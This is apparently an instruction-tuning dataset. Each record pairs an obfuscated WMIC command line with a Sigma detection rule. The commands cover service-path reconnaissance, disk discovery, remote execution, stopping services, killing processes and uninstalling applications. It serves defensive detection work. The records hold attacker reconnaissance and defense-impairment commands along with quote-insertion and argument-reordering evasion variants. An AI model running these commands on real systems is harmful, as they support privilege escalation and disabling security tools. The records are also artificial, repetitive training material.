{"instruction": "Write Sigma rule to detect payload:", "input": "wmic.exe \\WMIC.exe service get name,displayname,pathname,startmode", "output": "title: Potential Unquoted Service Path Reconnaissance Via Wmic.EXE\nid: 68bcd73b-37ef-49cb-95fc-edc809730be6\nrelated:\n    - id: 09658312-bc27-4a3b-91c5-e49ab9046d1b # PowerShell Variant\n      type: similar\n    - id: 76f55eaa-d27f-4213-9d45-7b0e4b60bbae\n      type: similar\nstatus: test\ndescription: Detects known WMI recon method to look for unquoted service paths using wmic. Often used by pentester and attacker enumeration scripts\nreferences:\n    - https://github.com/nccgroup/redsnarf/blob/35949b30106ae543dc6f2bc3f1be10c6d9a8d40e/redsnarf.py\n    - https://github.com/S3cur3Th1sSh1t/Creds/blob/eac23d67f7f90c7fc8e3130587d86158c22aa398/PowershellScripts/jaws-enum.ps1\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-09-11\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' service get '\n            - 'name,displayname,pathname,startmode'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic.exe \\WMIC.exe service g\\\"et\\\" name,displayname,pathname,startmode", "output": "title: Potential Unquoted Service Path Reconnaissance Via Wmic.EXE\nid: 68bcd73b-37ef-49cb-95fc-edc809730be6\nrelated:\n    - id: 09658312-bc27-4a3b-91c5-e49ab9046d1b # PowerShell Variant\n      type: similar\n    - id: 76f55eaa-d27f-4213-9d45-7b0e4b60bbae\n      type: similar\nstatus: test\ndescription: Detects known WMI recon method to look for unquoted service paths using wmic. Often used by pentester and attacker enumeration scripts\nreferences:\n    - https://github.com/nccgroup/redsnarf/blob/35949b30106ae543dc6f2bc3f1be10c6d9a8d40e/redsnarf.py\n    - https://github.com/S3cur3Th1sSh1t/Creds/blob/eac23d67f7f90c7fc8e3130587d86158c22aa398/PowershellScripts/jaws-enum.ps1\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-09-11\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' service get '\n            - 'name,displayname,pathname,startmode'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic.exe \\WMIC.exe service get name,displayname,--pathname,startmode", "output": "title: Potential Unquoted Service Path Reconnaissance Via Wmic.EXE\nid: 68bcd73b-37ef-49cb-95fc-edc809730be6\nrelated:\n    - id: 09658312-bc27-4a3b-91c5-e49ab9046d1b # PowerShell Variant\n      type: similar\n    - id: 76f55eaa-d27f-4213-9d45-7b0e4b60bbae\n      type: similar\nstatus: test\ndescription: Detects known WMI recon method to look for unquoted service paths using wmic. Often used by pentester and attacker enumeration scripts\nreferences:\n    - https://github.com/nccgroup/redsnarf/blob/35949b30106ae543dc6f2bc3f1be10c6d9a8d40e/redsnarf.py\n    - https://github.com/S3cur3Th1sSh1t/Creds/blob/eac23d67f7f90c7fc8e3130587d86158c22aa398/PowershellScripts/jaws-enum.ps1\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-09-11\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' service get '\n            - 'name,displayname,pathname,startmode'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic \\WMIC service get name,displayname,pathname,startmode", "output": "title: Potential Unquoted Service Path Reconnaissance Via Wmic.EXE\nid: 68bcd73b-37ef-49cb-95fc-edc809730be6\nrelated:\n    - id: 09658312-bc27-4a3b-91c5-e49ab9046d1b # PowerShell Variant\n      type: similar\n    - id: 76f55eaa-d27f-4213-9d45-7b0e4b60bbae\n      type: similar\nstatus: test\ndescription: Detects known WMI recon method to look for unquoted service paths using wmic. Often used by pentester and attacker enumeration scripts\nreferences:\n    - https://github.com/nccgroup/redsnarf/blob/35949b30106ae543dc6f2bc3f1be10c6d9a8d40e/redsnarf.py\n    - https://github.com/S3cur3Th1sSh1t/Creds/blob/eac23d67f7f90c7fc8e3130587d86158c22aa398/PowershellScripts/jaws-enum.ps1\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-09-11\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' service get '\n            - 'name,displayname,pathname,startmode'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic.exe name,displayname,pathname,startmode get \\WMIC.exe service", "output": "title: Potential Unquoted Service Path Reconnaissance Via Wmic.EXE\nid: 68bcd73b-37ef-49cb-95fc-edc809730be6\nrelated:\n    - id: 09658312-bc27-4a3b-91c5-e49ab9046d1b # PowerShell Variant\n      type: similar\n    - id: 76f55eaa-d27f-4213-9d45-7b0e4b60bbae\n      type: similar\nstatus: test\ndescription: Detects known WMI recon method to look for unquoted service paths using wmic. Often used by pentester and attacker enumeration scripts\nreferences:\n    - https://github.com/nccgroup/redsnarf/blob/35949b30106ae543dc6f2bc3f1be10c6d9a8d40e/redsnarf.py\n    - https://github.com/S3cur3Th1sSh1t/Creds/blob/eac23d67f7f90c7fc8e3130587d86158c22aa398/PowershellScripts/jaws-enum.ps1\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-09-11\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' service get '\n            - 'name,displayname,pathname,startmode'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe wmic.exe volume path win32_logicaldisk", "output": "title: System Disk And Volume Reconnaissance Via Wmic.EXE\nid: c79da740-5030-45ec-a2e0-479e824a562c\nrelated:\n    - id: d85ecdd7-b855-4e6e-af59-d9c78b5b861e\n      type: similar\nstatus: test\ndescription: |\n    An adversary might use WMI to discover information about the system, such as the volume name, size,\n    free space, and other disk information. This can be done using the `wmic` command-line utility and has been\n    observed being used by threat actors such as Volt Typhoon.\nreferences:\n    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: Stephen Lincoln `@slincoln-aiq`(AttackIQ)\ndate: 2024-02-02\ntags:\n    - attack.execution\n    - attack.discovery\n    - attack.t1047\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'volume'\n            - 'path win32_logicaldisk'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe wmic.exe volume \"pa\"th win32_logicaldisk", "output": "title: System Disk And Volume Reconnaissance Via Wmic.EXE\nid: c79da740-5030-45ec-a2e0-479e824a562c\nrelated:\n    - id: d85ecdd7-b855-4e6e-af59-d9c78b5b861e\n      type: similar\nstatus: test\ndescription: |\n    An adversary might use WMI to discover information about the system, such as the volume name, size,\n    free space, and other disk information. This can be done using the `wmic` command-line utility and has been\n    observed being used by threat actors such as Volt Typhoon.\nreferences:\n    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: Stephen Lincoln `@slincoln-aiq`(AttackIQ)\ndate: 2024-02-02\ntags:\n    - attack.execution\n    - attack.discovery\n    - attack.t1047\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'volume'\n            - 'path win32_logicaldisk'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe wmic.exe volume --path win32_logicaldisk", "output": "title: System Disk And Volume Reconnaissance Via Wmic.EXE\nid: c79da740-5030-45ec-a2e0-479e824a562c\nrelated:\n    - id: d85ecdd7-b855-4e6e-af59-d9c78b5b861e\n      type: similar\nstatus: test\ndescription: |\n    An adversary might use WMI to discover information about the system, such as the volume name, size,\n    free space, and other disk information. This can be done using the `wmic` command-line utility and has been\n    observed being used by threat actors such as Volt Typhoon.\nreferences:\n    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: Stephen Lincoln `@slincoln-aiq`(AttackIQ)\ndate: 2024-02-02\ntags:\n    - attack.execution\n    - attack.discovery\n    - attack.t1047\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'volume'\n            - 'path win32_logicaldisk'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC wmic volume path win32_logicaldisk", "output": "title: System Disk And Volume Reconnaissance Via Wmic.EXE\nid: c79da740-5030-45ec-a2e0-479e824a562c\nrelated:\n    - id: d85ecdd7-b855-4e6e-af59-d9c78b5b861e\n      type: similar\nstatus: test\ndescription: |\n    An adversary might use WMI to discover information about the system, such as the volume name, size,\n    free space, and other disk information. This can be done using the `wmic` command-line utility and has been\n    observed being used by threat actors such as Volt Typhoon.\nreferences:\n    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: Stephen Lincoln `@slincoln-aiq`(AttackIQ)\ndate: 2024-02-02\ntags:\n    - attack.execution\n    - attack.discovery\n    - attack.t1047\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'volume'\n            - 'path win32_logicaldisk'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe volume win32_logicaldisk path wmic.exe", "output": "title: System Disk And Volume Reconnaissance Via Wmic.EXE\nid: c79da740-5030-45ec-a2e0-479e824a562c\nrelated:\n    - id: d85ecdd7-b855-4e6e-af59-d9c78b5b861e\n      type: similar\nstatus: test\ndescription: |\n    An adversary might use WMI to discover information about the system, such as the volume name, size,\n    free space, and other disk information. This can be done using the `wmic` command-line utility and has been\n    observed being used by threat actors such as Volt Typhoon.\nreferences:\n    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: Stephen Lincoln `@slincoln-aiq`(AttackIQ)\ndate: 2024-02-02\ntags:\n    - attack.execution\n    - attack.discovery\n    - attack.t1047\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'volume'\n            - 'path win32_logicaldisk'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe wmic.exe /node: /node:127.0.0.1 /node:localhost", "output": "title: WMIC Remote Command Execution\nid: 7773b877-5abb-4a3e-b9c9-fd0369b59b00\nrelated:\n    - id: e42af9df-d90b-4306-b7fb-05c863847ebd\n      type: obsolete\n    - id: 09af397b-c5eb-4811-b2bb-08b3de464ebf\n      type: obsolete\nstatus: test\ndescription: Detects the execution of WMIC to query information on a remote system\nreferences:\n    - https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: '/node:'\n    filter_localhost:\n        CommandLine|contains:\n            - '/node:127.0.0.1 '\n            - '/node:localhost '\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC wmic /node: /node:127.0.0.1 /node:localhost", "output": "title: WMIC Remote Command Execution\nid: 7773b877-5abb-4a3e-b9c9-fd0369b59b00\nrelated:\n    - id: e42af9df-d90b-4306-b7fb-05c863847ebd\n      type: obsolete\n    - id: 09af397b-c5eb-4811-b2bb-08b3de464ebf\n      type: obsolete\nstatus: test\ndescription: Detects the execution of WMIC to query information on a remote system\nreferences:\n    - https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: '/node:'\n    filter_localhost:\n        CommandLine|contains:\n            - '/node:127.0.0.1 '\n            - '/node:localhost '\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe wmic.exe /node: /node:127.0.0.1 /node:localhost", "output": "title: WMIC Remote Command Execution\nid: 7773b877-5abb-4a3e-b9c9-fd0369b59b00\nrelated:\n    - id: e42af9df-d90b-4306-b7fb-05c863847ebd\n      type: obsolete\n    - id: 09af397b-c5eb-4811-b2bb-08b3de464ebf\n      type: obsolete\nstatus: test\ndescription: Detects the execution of WMIC to query information on a remote system\nreferences:\n    - https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: '/node:'\n    filter_localhost:\n        CommandLine|contains:\n            - '/node:127.0.0.1 '\n            - '/node:localhost '\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic.exe \\WMIC.exe service call stopservice startservice", "output": "title: Service Started/Stopped Via Wmic.EXE\nid: 0b7163dc-7eee-4960-af17-c0cd517f92da\nstatus: test\ndescription: Detects usage of wmic to start or stop a service\nreferences:\n    - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' service '\n            - ' call '\n        CommandLine|contains:\n            - 'stopservice'\n            - 'startservice'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic.exe \\\"\\WMIC.exe\\\" service call stopservice startservice", "output": "title: Service Started/Stopped Via Wmic.EXE\nid: 0b7163dc-7eee-4960-af17-c0cd517f92da\nstatus: test\ndescription: Detects usage of wmic to start or stop a service\nreferences:\n    - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' service '\n            - ' call '\n        CommandLine|contains:\n            - 'stopservice'\n            - 'startservice'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic.exe \\WMIC.exe service --call stopservice startservice", "output": "title: Service Started/Stopped Via Wmic.EXE\nid: 0b7163dc-7eee-4960-af17-c0cd517f92da\nstatus: test\ndescription: Detects usage of wmic to start or stop a service\nreferences:\n    - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' service '\n            - ' call '\n        CommandLine|contains:\n            - 'stopservice'\n            - 'startservice'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic \\WMIC service call stopservice startservice", "output": "title: Service Started/Stopped Via Wmic.EXE\nid: 0b7163dc-7eee-4960-af17-c0cd517f92da\nstatus: test\ndescription: Detects usage of wmic to start or stop a service\nreferences:\n    - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' service '\n            - ' call '\n        CommandLine|contains:\n            - 'stopservice'\n            - 'startservice'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic.exe \\WMIC.exe startservice stopservice call service", "output": "title: Service Started/Stopped Via Wmic.EXE\nid: 0b7163dc-7eee-4960-af17-c0cd517f92da\nstatus: test\ndescription: Detects usage of wmic to start or stop a service\nreferences:\n    - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' service '\n            - ' call '\n        CommandLine|contains:\n            - 'stopservice'\n            - 'startservice'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe wmic.exe call terminate", "output": "title: Application Terminated Via Wmic.EXE\nid: 49d9671b-0a0a-4c09-8280-d215bfd30662\nrelated:\n    - id: 847d5ff3-8a31-4737-a970-aeae8fe21765 # Uninstall Security Products\n      type: derived\nstatus: test\ndescription: Detects calls to the \"terminate\" function via wmic in order to kill an application\nreferences:\n    - https://cyble.com/blog/lockfile-ransomware-using-proxyshell-attack-to-deploy-ransomware/\n    - https://www.bitdefender.com/files/News/CaseStudies/study/377/Bitdefender-Whitepaper-WMI-creat4871-en-EN-GenericUse.pdf\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-11\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'call'\n            - 'terminate'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe wmic.exe ca\\\"ll\\\" terminate", "output": "title: Application Terminated Via Wmic.EXE\nid: 49d9671b-0a0a-4c09-8280-d215bfd30662\nrelated:\n    - id: 847d5ff3-8a31-4737-a970-aeae8fe21765 # Uninstall Security Products\n      type: derived\nstatus: test\ndescription: Detects calls to the \"terminate\" function via wmic in order to kill an application\nreferences:\n    - https://cyble.com/blog/lockfile-ransomware-using-proxyshell-attack-to-deploy-ransomware/\n    - https://www.bitdefender.com/files/News/CaseStudies/study/377/Bitdefender-Whitepaper-WMI-creat4871-en-EN-GenericUse.pdf\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-11\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'call'\n            - 'terminate'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe wmic.exe --call terminate", "output": "title: Application Terminated Via Wmic.EXE\nid: 49d9671b-0a0a-4c09-8280-d215bfd30662\nrelated:\n    - id: 847d5ff3-8a31-4737-a970-aeae8fe21765 # Uninstall Security Products\n      type: derived\nstatus: test\ndescription: Detects calls to the \"terminate\" function via wmic in order to kill an application\nreferences:\n    - https://cyble.com/blog/lockfile-ransomware-using-proxyshell-attack-to-deploy-ransomware/\n    - https://www.bitdefender.com/files/News/CaseStudies/study/377/Bitdefender-Whitepaper-WMI-creat4871-en-EN-GenericUse.pdf\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-11\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'call'\n            - 'terminate'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC wmic call terminate", "output": "title: Application Terminated Via Wmic.EXE\nid: 49d9671b-0a0a-4c09-8280-d215bfd30662\nrelated:\n    - id: 847d5ff3-8a31-4737-a970-aeae8fe21765 # Uninstall Security Products\n      type: derived\nstatus: test\ndescription: Detects calls to the \"terminate\" function via wmic in order to kill an application\nreferences:\n    - https://cyble.com/blog/lockfile-ransomware-using-proxyshell-attack-to-deploy-ransomware/\n    - https://www.bitdefender.com/files/News/CaseStudies/study/377/Bitdefender-Whitepaper-WMI-creat4871-en-EN-GenericUse.pdf\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-11\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'call'\n            - 'terminate'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe call wmic.exe terminate", "output": "title: Application Terminated Via Wmic.EXE\nid: 49d9671b-0a0a-4c09-8280-d215bfd30662\nrelated:\n    - id: 847d5ff3-8a31-4737-a970-aeae8fe21765 # Uninstall Security Products\n      type: derived\nstatus: test\ndescription: Detects calls to the \"terminate\" function via wmic in order to kill an application\nreferences:\n    - https://cyble.com/blog/lockfile-ransomware-using-proxyshell-attack-to-deploy-ransomware/\n    - https://www.bitdefender.com/files/News/CaseStudies/study/377/Bitdefender-Whitepaper-WMI-creat4871-en-EN-GenericUse.pdf\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-11\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'call'\n            - 'terminate'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe wmic.exe call uninstall", "output": "title: Application Removed Via Wmic.EXE\nid: b53317a0-8acf-4fd1-8de8-a5401e776b96\nrelated:\n    - id: 847d5ff3-8a31-4737-a970-aeae8fe21765 # Uninstall Security Products\n      type: derived\nstatus: test\ndescription: Detects the removal or uninstallation of an application via \"Wmic.EXE\".\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md#atomic-test-10---application-uninstall-using-wmic\nauthor: frack113\ndate: 2022-01-28\nmodified: 2024-07-02\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'call'\n            - 'uninstall'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\WMIC.exe\\\" wmic.exe call uninstall", "output": "title: Application Removed Via Wmic.EXE\nid: b53317a0-8acf-4fd1-8de8-a5401e776b96\nrelated:\n    - id: 847d5ff3-8a31-4737-a970-aeae8fe21765 # Uninstall Security Products\n      type: derived\nstatus: test\ndescription: Detects the removal or uninstallation of an application via \"Wmic.EXE\".\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md#atomic-test-10---application-uninstall-using-wmic\nauthor: frack113\ndate: 2022-01-28\nmodified: 2024-07-02\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'call'\n            - 'uninstall'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe wmic.exe --call uninstall", "output": "title: Application Removed Via Wmic.EXE\nid: b53317a0-8acf-4fd1-8de8-a5401e776b96\nrelated:\n    - id: 847d5ff3-8a31-4737-a970-aeae8fe21765 # Uninstall Security Products\n      type: derived\nstatus: test\ndescription: Detects the removal or uninstallation of an application via \"Wmic.EXE\".\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md#atomic-test-10---application-uninstall-using-wmic\nauthor: frack113\ndate: 2022-01-28\nmodified: 2024-07-02\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'call'\n            - 'uninstall'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
